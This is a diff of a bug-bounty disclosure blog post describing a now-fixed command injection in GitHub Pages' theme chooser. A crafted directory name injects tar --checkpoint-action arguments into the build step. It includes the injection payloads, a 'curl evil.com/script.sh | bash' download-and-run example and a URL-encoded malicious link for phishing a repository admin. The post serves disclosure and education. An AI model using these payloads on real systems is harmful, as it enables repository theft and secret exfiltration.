@@ -1,114 +1,81 @@
 ---
 layout: "post"
-title:  "Command Injection in the Github Pages Build Pipeline"
-date:   "2022-08-23"
+title:  "Command Injection in the GitHub Pages Build Pipeline"
+date:   "2022-08-25"
 author: "Joren Vrancken"
 lang: "en"
 ---
 
-<!--
-- Github heeft een prettig programma
-- GitHub Pro? Teams?
-- Images
-- Admin permissions are needed
- -->
-
-Recently, I participated in the (public) [GitHub Bug Bounty](https://bounty.github.com/) (run through [HackerOne](https://hackerone.com/github)). This is a writeup of a command injection bug I submitted.
+Recently, I participated in the [GitHub Bug Bounty](https://bounty.github.com/) (run through [HackerOne](https://hackerone.com/github)). This is a writeup of a command injection bug I discovered.
 
 ### GitHub Pages
+[GitHub Pages](https://pages.github.com/) is a static content hosting service. It allows users to host the contents of their repositories to `username.github.io` or a custom domain. It is widely used for hosting simple static pages, such as documentation and blogs (e.g. this blog is hosted on GitHub Pages).
 
-[GitHub Pages](https://pages.github.com/) is a static content hosting service for your repositories. It allows users to host the contents of their repositories to `username.github.io` or a custom domain. It is a great service that allows users to fully manage their content with Git and deploy their content quickly (e.g. this blog is hosted on GitHub Pages).
+To help users host nice looking content, GitHub Pages supports [Jekyll](https://jekyllrb.com/), a static site generator platform. By using Jekyll, you do not have to write HTML and CSS files for your blogs directly, but you can write Markdown and Jekyll turns it into HTML files for you. [Jekyll supports themes](https://jekyllrb.com/docs/themes/), a feature that helps users apply the same templates and style across their Jekyll websites.
 
-To help users host nice looking content, GitHub Pages supports [Jekyll](https://jekyllrb.com/), a static content generation platform that turns Markdown files into hostable HTML files.
-<!-- templates -->
-
-### Custom Domains
-
-When I started looking for potential bugs, I initally focussed on the custom domain feature of GitHub Pages. Users can point their own domains to the GitHub Pages servers (with a `CNAME` or `A` record) to host their content on their own domain.
-
-However, as GitHub does not know who owns a domain, users are able to submit any domain they want. This creates a great oppurunity for domain takeovers (a serious problem, that might be a good subject for another blog post).
-
-After I exhausted all my ideas (and got some domain takeover reports) on custom domains.
+All settings of a Jekyll site (e.g. the theme) are stored in a YAML configuration file. GitHub Pages automates parts of the Jekyll setup (including setting some settings).
 
 ### Setting a Jekyll Theme
-
 In the GitHub Pages settings of a repository, there is a _Theme Chooser_ section:
 ![GitHub Pages settings](/assets/github-pages-command-injection/settings-themes.png)
 
-As its name suggests, this automates the process of changing the Jekyll theme.
+As its name suggests, this automates the process of choosing a Jekyll theme.
 
 The _Change theme_ button links to:
 
 ```HTTP
-https://github.com/<owner>/<repo>/settings/pages/themes?select=<theme>&source=<branch>&source_dir=<directory>
+https://github.com/owner/repo/settings/pages/themes?select=&source=main&source_dir=/
 ```
+This URL as three parameters:
+* `select` is the currently selected theme (if a theme was already selected).
+* `source` is the selected branch in the Branch settings.
+* `source_dir` is the selected directory in the Branch settings.
 
-`<theme>` is the current theme (if a theme is already selected). `<branch>` and `<directory>` are taken directly from the _Branch_ section in the Pages settings, and specify the source of the files that we want to host.
-
-If we click the _Change theme_ button, we are taken to a new webpage:
+If we click this _Change theme_ button, we are taken to a new webpage that previews multiple Jekyll themes (it should be noted that access to this page requires administrative privileges on the repository. We discuss this later):
 ![GitHub Pages Theme Selector](/assets/github-pages-command-injection/select-theme.png)
 
 When we are done picking a theme and click the _Select theme_ button, GitHub makes a `POST` request:
 
 ```HTTP
-POST /<owner>/<repo>/settings/pages/theme HTTP/2
+POST /owner/repo/settings/pages/theme HTTP/2
 Host: github.com
 ...
 
-_method=put&authenticity_token=<token>&page[theme_slug]=<theme>&source=<branch>&source_dir=<directory>
+_method=put&authenticity_token=some_token&page[theme_slug]=cayman&source=main&source_dir=/
 ```
 
-Here we see the `source=<branch>&source_dir=<directory>` again. As we cannot change these values on the theme selector page, these have to be taken directly from the link that brought us to this page.
+Here we see the `source` and `source_dir` parameters again. As we cannot change these values on the theme selector page, these have to be taken directly from the link that brought us to this page.
 
-After the `POST` request, GitHub makes a new commit to change the Jekyll theme. GitHub makes these changes to the directory in the branch that is specified.
+After the `POST` request, GitHub automatically creates a new commit to change the Jekyll theme. GitHub makes these changes in the `source_dir` directory on the `source` branch. This commit, in turn, triggers a new GitHub Pages build. More on this in the next section.
 
-The commit in turn triggers a new build of GitHub Pages, which deploys the new theme. More on this in the next section.
+In the Pages settings, we are only able to specify two directories: `/` (i.e. the root of the branch) and `/docs`.
 
-In the Pages settings, we are only able to specify two directories: `/` (i.e. the root of the repository) and `/docs`. But what happens if we specify another directory in the theme chooser URL?
+![GitHub Pages directories](/assets/github-pages-command-injection/dirs.png)
 
-In other words, what happens if we go to
-
-```HTTP
-https://github.com/joren485/repo/settings/pages/themes?select=cayman&source=main&source_dir=/customdirectory
-```
-
-It turns out, that this is accepted behaviour and GitHub will use any directory name we provide as the source. For example, if we set `source_dir=/"test" test test>`, GitHub will use `/"test" test test>`.
+But what happens if we specify another directory in the theme chooser URL? It turns out, that this is accepted behaviour and GitHub will use any directory name we provide as the source. For example, if we use an esoteric directory name, like `source_dir=/"test" test test>`, GitHub will create a basic Jekyll setup in `/"test" test test>`:
 
 ![Arbitrary dir](/assets/github-pages-command-injection/arbitrary-dir.png)
 
 GitHub is even nice enough to enable GitHub Pages and create the directory, if we did not do this ourselves.
 
-We are now able to specify any arbitrary (branch and) directory to use as a GitHub Pages source.
+In short, we are able to specify any arbitrary directory to use as a GitHub Pages source.
 
 ### Deploying GitHub Pages
-
-GitHub Pages builds are actually just [GitHub Actions](https://docs.github.com/en/actions) workflows [^0]. These workflows consit of three jobs:
+GitHub Pages builds are actually just [GitHub Actions](https://docs.github.com/en/actions) workflows, consisting of three jobs:
 
 1. `build`:
-   1. Checks out the source of the repository ([`actions/checkout@v2`](https://github.com/actions/checkout)).
-   2. Runs Jekyll to turn the source files into static files ([`actions/jekyll-build-pages@v1`](https://github.com/actions/jekyll-build-pages)).
-   3. Uploads the static files ([`actions/upload-pages-artifact@v0`](https://github.com/actions/upload-pages-artifact)).
-2. `report-build-status`: Sends telemetry data about the build processing ([`actions/deploy-pages@v1`](https://github.com/actions/deploy-pages)).
-3. `deploy`: Deploys the static files ([`actions/deploy-pages@v1`](https://github.com/actions/deploy-pages))
+   1. Check out the source of the repository ([`actions/checkout@v2`](https://github.com/actions/checkout)).
+   2. Run Jekyll to turn the source files into static files ([`actions/jekyll-build-pages@v1`](https://github.com/actions/jekyll-build-pages)).
+   3. Upload the static files ([`actions/upload-pages-artifact@v0`](https://github.com/actions/upload-pages-artifact)).
+2. `report-build-status`: Send telemetry data about the build processing ([`actions/deploy-pages@v1`](https://github.com/actions/deploy-pages)).
+3. `deploy`: Deploy the static files ([`actions/deploy-pages@v1`](https://github.com/actions/deploy-pages))
 
-In this writeup, we focus on `actions/upload-pages-artifact@v1`.
+`actions/upload-pages-artifact` is interesting, because uploading artitifacts most often happens with another action ([`actions/upload-artifact`](https://github.com/actions/upload-artifact)). What is the difference between the two?
 
-[The code of `actions/upload-pages-artifact@v1`](https://github.com/actions/upload-pages-artifact/blob/5abd6d2e035406f412d089536ee922a104d12f2b/action.yml):
+[The code of `actions/upload-pages-artifact@v0`](https://github.com/actions/upload-pages-artifact/blob/5abd6d2e035406f412d089536ee922a104d12f2b/action.yml) shows us that `actions/upload-pages-artifact` actually uses `actions/upload-artifact`, but first runs a `tar` command:
 
 ```YAML
-name: 'Upload Pages artifact'
-description: 'A composite action that prepares your static assets to be deployed to GitHub Pages'
-inputs:
-  path:
-    description: 'Path of the directoring containing the static assets.'
-    required: true
-    default: '_site/'
-  retention-days:
-    description: 'Duration after which artifact will expire in days.'
-    required: false
-    default: '1'
-runs:
-  using: composite
+{%raw%}...
   steps:
     - name: Archive artifact
       shell: bash
@@ -124,12 +91,12 @@ runs:
       with:
         name: github-pages
         path: ${{ runner.temp }}/artifact.tar
-        retention-days: ${{ inputs.retention-days }}
+        retention-days: ${{ inputs.retention-days }}{%endraw%}
 ```
 
-If we look at the Github Actions pipeline logs of a succesful run, we see how the `tar` command is used:
+If we look at the GitHub Actions pipeline logs of a succesful Pages deployment (where we set the directory to `/docs`), we see the values of the variables in the `tar` command:
 
-```
+```Bash
 tar \
     --dereference --hard-dereference \
     --directory ./docs/_site \
@@ -138,9 +105,9 @@ tar \
     .
 ```
 
-In this case, we set the GitHub Pages directory to `/docs`. This tells us that `${{ inputs.path }}` is equal to `.<the direcotry we specify>/_site` and `${{ runner.temp }}` equals `/home/runner/work/_temp`.
+This tells us that `inputs.path` is equal to `.<the direcotry we specify>/_site` and `runner.temp` equals `/home/runner/work/_temp`.
 
-In the previous section we saw that we have full control over the direcotry name. As [Linux allows virtually every character in directory names](https://en.wikipedia.org/wiki/Filename#Comparison_of_filename_limitations), we can set the directory to anything we want. So, what happens if we set the directory to something like `/ --asdf=`? Will this change the `tar` command to the following?
+In the previous section, we saw that we have full control over the direcotry name and because Linux (the OS used on the GitHub Actions runners) [allows virtually every character in directory names](https://en.wikipedia.org/wiki/Filename#Comparison_of_filename_limitations), we can set the directory name to anything we want. What happens if we set the directory to something like `/ --asdf=`? Will this change the `tar` command to the following?
 
 ```bash
 tar \
@@ -155,11 +122,11 @@ Yes, it will:
 
 ![Tar asdf command](/assets/github-pages-command-injection/tar-command-asdf.png)
 
-As we can see, `--asdf` is interpreted as a command line argument and not as the directory name. This means we have command injection.
+As we can see, `--asdf` is interpreted as a command line argument and not as part of the directory name. We have found command injection.
 
 ### Arbitary Code Execution with `tar`
-
-A feature of `tar` allows us to execute aribtrary commands. Adding `--checkpoint=1 --checkpoint-action="exec=id"` to a `tar` command will make it execute a command (e.g. `id`) for every processed file.
+`tar` has a feature, called [Checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html), that we can use to run aribtrary commands.
+Adding the `--checkpoint=1 --checkpoint-action="exec=<command>"` arguments to a `tar` command will make it execute `<command>` for every processed file.
 
 From the [man page](https://man7.org/linux/man-pages/man1/tar.1.html):
 
@@ -171,37 +138,76 @@ From the [man page](https://man7.org/linux/man-pages/man1/tar.1.html):
         Run ACTION on each checkpoint.
 ```
 
-**Side note:** Using `--checkpoint-action` is one way to achieve code execution, but of course not the only way. As we have full control over the input, we can exit the `tar` command and execute arbitrary command. But by using `--checkpoint-action`, the `tar` command (and consequently the whole GitHub Actions workflow) will still succeed, making the attack less obivious.
+As a test, let's execute [`id`](https://man7.org/linux/man-pages/man1/id.1.html). We want the `tar` command to look like:
 
-### Putting It All Together
+```bash
+tar \
+    --dereference --hard-dereference \
+    --directory ./ --checkpoint=1 --checkpoint-action="exec=id" --exclude=_site \
+    -cvf /home/runner/work/_temp/artifact.tar \
+    --exclude=.git \
+    .
+```
 
-To recap:
+This means our payload (i.e. the directory name we specify) is `/ --checkpoint=1 --checkpoint-action="exec=id" --exclude=`. We use the theme selector to set the directory name to the payload and wait for the pipeline to hit the `tar` command:
 
-1. We can craft URLs that will deploy GitHub Pages from arbitrary directories.
-2. The `tar` command in the GitHub Pages build process is vulnerable to command injection.
-3. We can use the `tar` command to execute arbitary commands by using `--checkpoint-action`.
+![Code execution](/assets/github-pages-command-injection/code-execution-id.png)
 
-### What Would an Attack Look Like?
+Great! We have succesfully achieved arbitrary code execution.
 
-And you might be thinking: "You found code execution on a GitHub Actions runner. Big Deal. So, what? Running code specified by users is exactly what CI runners are for. You just found a way to do it with extra steps."
+**Side note:** _Using `--checkpoint-action` is one way to achieve code execution, but not the only way. As we have full control over the input, we can exit the `tar` command and execute arbitrary commands. But by using `--checkpoint-action`, the `tar` command (and consequently the whole pipeline) will still succeed, making the attack less obivious to a victim._
 
-This thought is correct, however,
+### An Example Attack
+Now, you might be thinking: "You found command injection vulnerablity on a GitHub Actions runner as an admin. Big deal. So, what? Running arbitrary code specified by users is exactly what CI runners are for. You just found a way to do it in extra steps."
+
+And you would be correct. However, what makes this exploitable is the fact that it can be triggered through a URL.
+
+Say we are an attacker that wants to get access to the code in a private repo of a company. We can use this vulnerablity to get access to the code:
+
+1. We craft a malicious payload: `/ --checkpoint=1 --checkpoint-action="exec=curl -s evil.com/script.sh | bash" --exclude=`.
+  * This payload downloads and executes a script from an attacker controlled server.
+2. We craft a malicious URL (with a URL encoded payload):
+
+    ```HTTP
+    https://github.com/company/privatecode/settings/pages/themes?source=non-existent-branch&source_dir=%2F%20%2D%2Dcheckpoint%3D1%20%2D%2Dcheckpoint%2Daction%3D%22exec%3Dcurl%20%2Ds%20evil%2Ecom%2Fscript%2Esh%20%7C%20bash%22%20%2D%2Dexclude%3D
+    ```
+
+3. We send the URL to an admin of the `company/privatecode` repository.
+4. The admin clicks the link and follows the normal process of selecting a theme (i.e. clicking the _Select theme_ button).
+5. We wait for the GitHub Actions pipeline to run the `tar` command and execute our code.
+6. We have full access to the repository.
+
+The big caveat here is, of course, the requirement of user interaction by a repository admin. However, there are some compensating factors:
+
+* This attack works on repositories that do not have GitHub Pages enabled, because it is automatically enabled.
+* The specified branch does not need to exist, because it is automatically created.
+* The user only needs to follow the normal flow of selecting a theme (i.e. clicking one button) to trigger the attack.
+* The attacker does not need to have a GitHub account.
+
+### Other Attacks
+Besides reading code in a repository, code execution on a GitHub Actions runner allows for some other attacks:
+
+* Extracting any secrets passed to the runner (e.g. `ACTIONS_ID_TOKEN_REQUEST_TOKEN`).
+* Publishing any content on the GitHub Pages site of the victim.
+* Performing some malicious computations (e.g. crypto mining) at the cost of the victim.
 
 ### Fixing the Issue
-
-GitHub resolved the problem by removing the Theme Chooser functionality and replaced it with a link to [their documentation](https://docs.github.com/en/pages/setting-up-a-github-pages-site-with-jekyll/adding-a-theme-to-your-github-pages-site-using-jekyll):
+GitHub resolved the problem by removing the Theme Chooser functionality. The Pages settings now say "Learn how to add a Jekyll theme to your site":
 
 ![GitHub Pages new settings](/assets/github-pages-command-injection/new-settings-themes.png)
 
+### Closing Thoughts
+This was definitely one of the more fun bug bounties I did, because it combines multiple GitHub-specific features with some more traditional Hack The Box-esque techniques (e.g. using `--checkpoint-action`).
+
+I wholeheartly recommend the GitHub bug bounty program. Their triage team responded quickly and took time to really understand the reports I sent in.
+
 ---
 
-<!-- Tijden -->
 ### Disclosure Timeline
+_All times are in CEST._
 
-* 2022-07-29: Notified GitHub (through Hackerone)
-* 2022-07-29: First response from GitHub
-* 2022-08-02: GitHub confirmed the bug
-* 2022-08-23: Resolved and rewarded $4000 and GitHub Pro.
-
----
-[^0]: [GitHub actually allows users to use GitHub Actions directly to build and deploy their GitHub Pages sites](https://github.blog/changelog/2021-12-16-github-pages-using-github-actions-for-builds-and-deployments-for-public-repositories/), to allow them to customize the deployment workflow.
+* 2022-07-29 20:44: Notified GitHub (on Hackerone).
+* 2022-07-29 20:54: First response from GitHub.
+* 2022-08-02 19:26: GitHub confirmed the bug.
+* 2022-08-23 16:54: GitHub notified me that they resolved the issue.
+* 2022-08-23 16:55: GitHub rewarded me $4000 and a free GitHub Pro subscription.
